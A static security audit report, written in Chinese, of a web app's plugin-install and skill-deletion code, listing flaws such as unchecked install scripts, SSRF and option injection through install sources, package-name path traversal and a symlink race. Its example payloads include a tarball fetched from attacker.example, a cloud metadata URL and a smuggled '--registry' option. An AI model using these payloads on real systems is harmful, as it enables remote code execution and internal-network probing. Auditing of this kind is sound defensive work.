# rev-plugins 静态审查

范围：相对 HEAD `1d4efba` 的未提交工作区。只读源码与已安装 SDK，未跑 npm / vitest / build，未改 git 状态，未做动态探针。

审查文件：`src/lib/plugins-service.ts`、`src/lib/plugins-marketplace.ts`、`src/lib/skills-service.ts`、`src/lib/extension-ui.ts`、`src/lib/skill-frontmatter.ts`、`src/components/ExtensionUI.tsx`、`src/components/settings/PluginMarketplace.tsx`、`src/components/settings/SkillsSection.tsx`、`src/components/settings/PluginsSection.tsx`、`src/app/api/plugins/route.ts`、`src/app/api/plugins/marketplace/route.ts`、`src/app/api/skills/route.ts`、`examples/piweb-extensions/`。行为证据还引用这些调用的 SDK：`node_modules/@earendil-works/pi-coding-agent/dist/core/package-manager.js`、`dist/core/resource-loader.js`、`dist/utils/git.js`、`dist/utils/paths.js`。

### [CRITICAL] src/app/api/plugins/route.ts:62
**问题**：安装或更新插件等于以服务器用户身份执行任意第三方代码。npm/git 安装没有 `--ignore-scripts`，没有来源白名单，也没有完整性钉扎。本地路径安装会在随后的加载器重载中执行该路径上的扩展模块。
**触发条件**：已通过启动令牌会话的同源 `POST /api/plugins`（`src/proxy.ts:25-29`；认证默认开启，仅 `PI_WEB_AUTH=0` 关闭，`src/lib/web-auth.ts:47-49`），`action` 为 `install` 或 `update`。`source` 只要长度 ≤ 4096。界面入口是市场项 `item.source`（`src/components/settings/PluginMarketplace.tsx:538-552`）或自由文本（`src/components/settings/PluginsSection.tsx:1032-1038`）。例如 `npm:任意包@版本`、`npm:https://host/pkg.tgz`、`https://host/user/repo`、存在的本地目录。不需要包带 `pi-package` 关键字，也不需要是合法扩展。
**期望行为**：安装只接受允许的来源；固定注册表与完整性哈希；安装与依赖的生命周期脚本不执行（与本仓库自更新一致）；失败不留下已执行的副作用。
**实际行为**：`installPackage` 把原始 `source` 交给 `pm.installAndPersist`（`src/lib/plugins-service.ts:417-422`）。SDK `install`（`package-manager.js:811-836`）对 npm 执行 `install <spec> --prefix <root> --legacy-peer-deps --no-audit --no-fund`（`package-manager.js:1630-1658`），对 git 先 `git clone` 再在检出目录执行 npm/pnpm/bun install（`package-manager.js:1678-1702`、`1608-1624`）。全文件无 `ignore-scripts` / `ignoreScripts`。pnpm 还设置 `--config.strict-dep-builds=false`（`package-manager.js:1614-1619`、`1641-1650`），放开 pnpm 默认会拦住的依赖构建。对比：PiWeb 自更新使用 `--ignore-scripts` 与官方注册表参数（`src/lib/update-service.ts:184`）。市场只在展示时要求关键字 `pi-package`（`src/lib/plugins-marketplace.ts:438`），安装体是客户端传来的 `npm:${name}@${version}`（同文件 `:471`），不读取 `dist.integrity`，服务端不复核关键字。`updatePackages` 同样调用 `pm.update`（`src/lib/plugins-service.ts:459-462`），更新批次走同一个 `installNpmBatch`（`package-manager.js:1037-1040`）。本地路径被 `parseSource` 判为 `local`（`package-manager.js:1308-1316`，`paths.js:76-88`），安装只检查路径存在，随后 `applyResourceChange` → 加载器 `reload` → `loadFinalExtensionSet` / `loadExtensionsCached`（`resource-loader.js:427`、`:527`）执行该路径代码。卸载走 `npm uninstall`（`package-manager.js:1660-1676`），同样会跑 uninstall 脚本。
**证据**：`route.ts:44-46` 只拒绝超长字符串；`:62-75` 把 `source` 原样传入。`package-manager.js` 对 `ignore-scripts` 零匹配。`plugins-marketplace.ts:469-471` 的 `source` 只有名称和版本字符串。
**修复建议**：安装入口拒绝非白名单来源；npm 安装固定注册表并传 `--ignore-scripts` 与 registry 返回的 `dist.integrity`；不要把未钉扎的 spec 直接交给包管理器。扩展代码执行若必须保留，应与“安装时脚本”分开，并限制在已校验的包根内。
**最小失败测试**：在仅含 `preinstall`/`postinstall`（写一个标记文件或启动进程）、没有 `pi` 字段的包上 `POST /api/plugins {"action":"install","source":"npm:<spec>"}`。断言标记被创建。再断言 `source` 为任意未在白名单内的合法包名时接口不是 4xx。

### [HIGH] src/app/api/plugins/route.ts:62
**问题**：安装源可以让服务器向任意主机发起 git/npm 请求（SSRF），npm spec 还可以注入 npm 配置参数。
**触发条件**：与上一条相同的已认证 `POST`，`action=install`。`source` 为 `git:http://127.0.0.1:9/a/b`、`http://169.254.169.254/latest/meta-data`（路径至少两段）、`ssh://git@internal/a/b.git`、`npm:https://attacker.example/x.tgz`，或 spec 本身以 `-` 开头，例如 `npm:--registry=http://127.0.0.1:9/`。
**期望行为**：git 只允许固定主机与 https；npm 只允许注册表上的合法包名加版本，spec 不能是 URL、本地路径或 `-` 开头的选项；服务器不连接用户给定的主机。
**实际行为**：`parseSource` 在 `npm:` 之后把剩余字符串当作 spec（`package-manager.js:1296-1306`）。`isLocalPath` 对 `http(s):`/`git:`/`ssh:` 返回 false（`paths.js:76-88`），于是落到 `parseGitUrl`。无 `git:` 前缀时仍接受 `http`/`https`/`ssh`/`git` URL（`git.js:150-155`、`116-140`）。`buildGitSource` 只拒绝空主机、`..`、反斜杠和不足两段的路径（`git.js:86-104`），不拒绝环回、链路本地或内网 IP。`installGit` 执行 `git clone source.repo`（`package-manager.js:1696`）。npm 则把 spec 作为单独 argv 放进 `npm install`（`package-manager.js:1630-1658`），`https://` tarball 会被 npm 拉取；以 `--` 开头的 spec 成为 npm 选项（如 `--registry`）。市场搜索/检查的 URL 是写死的 `https://registry.npmjs.org/...` 且对 name/version 做了 `encodeURIComponent`（`plugins-marketplace.ts:515`、`:573`），这条 SSRF 不来自市场 GET/POST 检查。
**证据**：`git.js:116-120` 显式允许 `http://` 与 `git://`。`package-manager.js:1652-1658` 未过滤 spec。`route.ts:62-64` 未解析协议。
**修复建议**：安装前只接受 `npm:` + 合法包名 + 精确版本，或预置 git 主机的 https URL；拒绝 `http:`、`git:`、`ssh:`、`file:`、路径 spec 和以 `-` 开头的 token；git/npm 都禁止用户控制的主机。
**最小失败测试**：本机起一个只记录请求的 HTTP 服务。`POST` `{"action":"install","source":"http://127.0.0.1:<port>/aa/bb"}` 或 `{"source":"npm:--registry=http://127.0.0.1:<port>/"}`。断言该端口收到来自 PiWeb 进程的连接。

### [HIGH] src/lib/plugins-service.ts:422
**问题**：npm 包名含 `..` 时，安装路径解析逃出 `npm/node_modules`。仓库内没有自写 zip 解压，不能据此声称 tarball zip-slip；包名穿越是独立的路径拼接问题。
**触发条件**：`POST /api/plugins` `action=install`，`source` 为 `npm:../../outside/pkg` 或 `npm:@scope/../../outside`。npm 把该 spec 当本地路径安装成功后，`addSourceToSettings` 会保存它（`package-manager.js:834-836`、`:652-674`）。之后任何 `getInstalledPath` / 资源加载都使用逃出的路径。
**期望行为**：包名只允许 registry 合法字符；解析后的安装目录必须落在对应 scope 的 `npm/node_modules` 内，与 git 路径同一套边界检查。
**实际行为**：`parseNpmSpec` 用 `/^(@?[^@]+(?:\/[^@]+)?)(?:@(.+))?$/` 取 name，不拒绝 `..`（`package-manager.js:1559-1566`）。`getManagedNpmInstallPath` 是 `join(root, "node_modules", source.name)`（`:1921-1929`），`path.join` 会折叠 `..`。`join(agentDir, "npm", "node_modules", "@scope/../../outside")` 变成 `agentDir/outside`。git 路径走 `resolveManagedPath`，越界会抛错（`:1976-1981`）；npm 查找路径没有这道检查。
**证据**：`plugins-service.ts:422` 把未校验的 `source` 交给 `installAndPersist`。SDK 两处实现如上。本仓库变更文件中无 unzip/tar 解压逻辑。
**修复建议**：在调用 SDK 前拒绝 name 中的 `..`、绝对路径和盘符；或让 npm 查找使用与 `resolveManagedPath` 相同的根约束。不要用 spec 字符串拼接磁盘路径。
**最小失败测试**：在用户目录外放置带 `package.json` 的目录。安装 `npm:../../<该相对路径>` 成功后读取已安装路径。断言该路径的规范形式不以 `<agentDir>/npm/node_modules/` 为前缀。

### [HIGH] src/lib/skills-service.ts:303
**问题**：技能删除的 junction/符号链接检查与真正删除之间没有约束，祖先目录被换成 junction 后会回收工作区外的文件。
**触发条件**：目标是受管根内的普通技能目录（例如 `<cwd>/.pi/skills/<name>/SKILL.md`），`POST /api/skills` `action=delete`。在 `skillDeletionPlan` 的逐段 `lstat` 完成之后、`recoverableRemove` 第一次 `lstat` 之前，把该路径的某个祖先换成指向工作区外的 NTFS junction（或符号链接）。窗口里还有 `toComparablePath`、`protectedDirs` 等 await（`skills-service.ts:285-295`），以及计划返回后到 `recoverableRemove` 之间的间隙（`:303-306`）。攻击者需要能改这些目录的本地进程；单次请求、事先放好的 junction 不会走这条，因为事先存在的 junction 会在 `:278` 被当成链接。
**期望行为**：删除全程用打开的目录句柄或在回收前重新 `realpath`，确认最终目标仍在受管根内，且祖先不是 reparse point。与 `src/lib/confined-file-operations.ts:26` 已写明的“目录描述符钉住遍历”一致。
**实际行为**：`skillDeletionPlan` 只在计划阶段对 `root.raw` 到文件的每一段做 `lstat().isSymbolicLink()`（`:274-284`）。通过后返回的是路径字符串。`:285` 的边界检查用的是更早算好的 `comparableFile`（`:249`），不会在删除前再解析。`deleteSkill` 的 `expectedPath` 只用 `path.resolve` 做词法比较（`:305`）。`recoverableRemove` 对最后一段是符号链接时只 `rename` 链接（`src/lib/recoverable-remove.ts:126-129`）；祖先 junction 会在打开路径时被系统跟过去。最后一段若是普通目录，Windows 上走 `DeleteDirectory` 回收站（`:134-138`），删的是 junction 目标里的同名目录。
**证据**：`:278` 与 `:303-306` 之间无锁、无二次 `realpath`、无设备号比较。`recoverable-remove.ts:96` 对非链接目标使用 `fs.realpath`，会跟随祖先 reparse point。
**修复建议**：在同一把锁内用 `lstat` 打开每一级祖先，拒绝 reparse point；用目录句柄做最后的删除。回收前断言 `realpath` 仍在 `root.canonical` 内。
**最小失败测试**：创建 `skills/foo/SKILL.md`。在 `deleteSkill` 已经返回计划、尚未 `lstat` 删除目标时，把 `skills` 换成指向临时目录 `victim/foo` 的 junction。断言 `victim/foo` 被回收，或测试在修复后收到“目标已移出受管根”错误且 `victim` 仍在。

### [HIGH] src/lib/skills-service.ts:278
**问题**：删除边界只认 `isSymbolicLink()`。Windows 的 NTFS junction 会被这道检查拦住；Linux bind mount 不会，删除会走入挂载源。
**触发条件**：Windows：`mklink /J` 的 junction 位于受管根与 `SKILL.md` 之间，或位于技能目录的子路径上。这种情况下本函数不会删 junction 目标。Linux：把技能目录或其中一层做成同一文件系统上的 bind mount（不是符号链接），再 `POST /api/skills` `action=delete`。
**期望行为**：任何不是本目录真实子项的挂载、junction、符号链接都只解除链接本身；用 `st_dev` 变化或等价的挂载点检测补上“不是符号链接”的挂载。
**实际行为**：Node 的 `fs.lstat` 把 junction（`IO_REPARSE_TAG_MOUNT_POINT`）和符号链接都标成符号链接，因此 `:278` 对标准 NTFS junction 为真，函数返回 `{ link: true }`（`:282`），`recoverableRemove` 只重命名链接（`recoverable-remove.ts:126-129`）。子目录里的 junction 也会在 `fingerprint` 里被标成链接（`recoverable-remove.ts:58-60`），Windows 上整目录改为 `rename` 而不是递归回收（`:130-133`）。Linux bind mount 的 `lstat` 是目录且 `isSymbolicLink()` 为 false，`realpath` 仍留在技能路径上，`:285` 的 `within` 通过，于是 `copyPreservingLinks` 会把挂载源的内容复制进备份（`recoverable-remove.ts:43-45`）。本次未在 Node v24.12.0 上实际创建 junction（审查限制为静态分析）；结论依据的是上述调用与 libuv 对 `MOUNT_POINT`/`SYMLINK` 同为 `S_IFLNK` 的契约，不是本次探针。
**证据**：`skills-service.ts:276-283` 只调用 `isSymbolicLink()`，没有 `st_dev` 比较。`recoverable-remove.ts:38-45` 对非链接目录递归复制。
**修复建议**：遍历时记录根的 `dev`，子级 `dev` 变化即按挂载点处理，只解除该层、不递归。Windows 上继续把 junction 当链接。
**最小失败测试**：Linux：`mount --bind /tmp/outside /path/to/skills/foo`，在 `foo/SKILL.md` 放技能并在 `/tmp/outside` 放 canary。删除该技能。断言 canary 被复制到备份或被移走。Windows：同样布局改用 `mklink /J`，断言 canary 仍在且只移除了 junction。

### [MEDIUM] src/lib/skills-service.ts:279
**问题**：判断“这条链接下面还有没有别的技能”时没有做 Windows 大小写折叠，会移除仍被其它技能使用的 junction/符号链接。不会因此删除链接目标。
**触发条件**：同一 junction 下至少两个已发现技能，`filePath` 字符串只有大小写不同（设置里写 `...\Link\...`，目录枚举得到 `...\link\...`）。删除其中一个。
**期望行为**：与 `toComparablePath`（`skills-service.ts:64-65`）一样，Windows 上先大小写折叠再做前缀比较。
**实际行为**：`:279` 使用 `within(path.resolve(skill.filePath).replace(/\\/g, "/"), candidate.replace(/\\/g, "/"))`。`within`（`:85`）是区分大小写的 `startsWith`。比较失败时不会抛“链接内还有其它技能”，而返回 `link: true` 并移除该链接（`:282`）。目标目录因为 `:126-129` 的链接分支得以保留，但其它技能失去这条路径。
**证据**：`:64-65` 对规范路径 `toLowerCase()`，`:279` 没有。
**修复建议**：这里改为比较 `toComparablePath` 的结果。
**最小失败测试**：两个技能路径只差目录大小写，且中间一层是 junction。预览删除应拒绝；当前实现的 `removed` 等于该 junction。

### [MEDIUM] src/lib/plugins-service.ts:420
**问题**：安装失败不会回滚已执行的脚本副作用；npm 失败也不会清掉已写入的安装树。git 只删除检出目录。持久化之后的刷新失败被当成成功。
**触发条件**：`install`/`update` 过程中 npm 在脚本已运行后返回非零；或 `install()` 已成功并 `setPackages`/`save` 之后，`flushSettingsOrThrow` 或 `verifySettingsField` 抛错（`plugins-service.ts:422-424`）；或资源刷新失败。
**期望行为**：安装要么完整提交，要么恢复安装前的 settings 与安装目录，并且不运行无法撤销的脚本。刷新失败不得报告成已成功安装。
**实际行为**：`installAndPersist` 只有 `install` 返回后才改 settings（`package-manager.js:834-836`）。`installNpm` 没有失败清理（`:1655-1658`）。`installGit` 在 catch 里 `rmSync` 检出目录（`:1705-1708`），但 catch 之前已经可能跑过依赖安装脚本（`:1700-1702`），脚本写到目录外的文件不会被删。`setPackages` 会 `save`（`settings-manager.js:862-865`）。其后 PiWeb 的 flush/校验失败不会调用 `remove`。`ResourceRefreshError` 被 API 收成 `success: true`（`src/app/api/plugins/route.ts:79`）。
**证据**：上述分支均无卸载或目录恢复补偿。自更新路径有 `--ignore-scripts`，插件路径没有。
**修复建议**：先禁止脚本。`install` 抛错时删除本次 prefix 变更；flush/校验失败时调用与成功路径对称的 `removeAndPersist`。刷新失败返回非成功状态。
**最小失败测试**：包的 `postinstall` 在临时目录外写标记后以非零退出。断言标记仍在，且 `npm/node_modules` 下仍有残留，同时 settings 里没有该 source。

## 覆盖

已逐行阅读：`plugins-service.ts`、`plugins-marketplace.ts`、`skills-service.ts`、`extension-ui.ts`、`skill-frontmatter.ts`、`ExtensionUI.tsx`、三个 API route、`recoverable-remove.ts` 的删除路径、`path-security.ts` 的 `resolveDiscoveredPath`、`pi.ts` 的加载器补丁、SDK `package-manager.js` 的 install/resolve/路径函数、`git.js`、`paths.js` 的 `isLocalPath`。`PluginMarketplace.tsx` 核对了安装按钮与 `repoUrl`/`npmUrl` 的 `href`。`PluginsSection.tsx` 核对了自由文本安装。`examples/piweb-extensions/` 只通过 JSON 树调用 `ctx.ui.web`，无 `innerHTML`。

## 未追踪

1. npm 自身解 tarball 的实现（仓库无自写 unzip，不能证明或否定 zip-slip）。
2. `loadExtensionsCached` 的模块加载与缓存细节（只确认 reload 会执行已安装扩展）。
3. `hosted-git-info` 内部 shorthand 的全部解析分支。
4. `SettingsManager.save` 在磁盘写入失败时内存与文件是否分叉。
5. `PluginMarketplace.tsx` 前半与 `PluginsSection.tsx` 中与安装/链接无关的展示代码。
6. `examples/piweb-extensions/` 三个样板的后半与 README。
7. 未在 Node v24.12.0 上创建 junction 做动态确认。

## 维度结论

- 生命周期脚本：会执行。安装/更新/卸载都没有 `--ignore-scripts`。这是 CRITICAL。
- 来源白名单：没有。市场关键字只过滤搜索展示。API 接受任意 ≤4096 的 `source`。
- 完整性：没有。不读、不传 `dist.integrity`。
- zip-slip：变更文件中没有自写解压。包名 `..` 可以逃出 npm 安装根，见 HIGH。
- SSRF / URL：市场回源主机写死为 `registry.npmjs.org`，name/version 经过 `encodeURIComponent`，展示链接只留 `http:`/`https:`（`plugins-marketplace.ts:416-427`）且服务端不回源这些链接。安装通道不使用这套校验，git/npm URL 和 `--registry` 可以打到任意主机。
- 只读 GET 与 npm install：不会。发现加载器把 `resolve` 固定为 `skip`（`src/lib/pi.ts:277-283`，在 `reload` 前安装，`:321`、`:348`）。`reload` 里的 `resolveExtensionSources(additionalExtensionPaths)` 默认是空数组（`resource-loader.js:272`、`:384`；PiWeb 构造加载器时未传入）。`listPackages` 只对已经存在的绝对安装路径做 `resolveExtensionSources`（`plugins-service.ts:154-157`），该路径是 `local`，不走 `installMissing`（`package-manager.js:1108-1111`）。GET 仍会 `reload` 并执行已经安装的扩展模块，这不是 npm install。
- 技能删除与 NTFS junction：标准 junction 被 `lstat().isSymbolicLink()` 拦住，不会沿链接删到目标。硬链接只解除技能目录里的这个名字，不会删掉工作区外的另一个名字。竞态替换祖先可以绕过，见 HIGH。大小写只破坏“链接下还有其它技能”的拒绝，见 MEDIUM。
- 扩展 UI HTML：`ExtensionUI.tsx` 与 `extension-ui.ts` 没有 `dangerouslySetInnerHTML`、`iframe` 或 `srcdoc`。树节点以 React 文本子节点渲染（`ExtensionUI.tsx:155`、`:229`、`:423`）。服务端 `sanitizeUiTree` 只做白名单与截断（`extension-ui.ts:105-179`）。不构成 DOM HTML 注入。
- 失败回滚：不完整，见 MEDIUM。
